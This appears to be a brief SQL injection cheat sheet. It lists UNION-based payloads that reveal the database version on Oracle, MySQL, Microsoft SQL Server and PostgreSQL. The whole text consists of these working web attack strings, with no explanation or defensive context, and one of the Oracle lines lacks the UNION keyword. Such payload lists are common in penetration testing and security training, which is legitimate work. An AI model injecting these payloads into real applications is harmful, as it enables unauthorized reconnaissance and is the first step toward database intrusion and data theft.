## ORACLE
```sql
' UNION SELECT BANNER, NULL FROM v$version--
' SELECT version FROM v$instance--
```
## MySQL and Microsoft
```sql
' UNION SELECT @@version, NULL-- -
```
## PostgreSQL
```sql
' UNION SELECT version(), NULL-- -
```
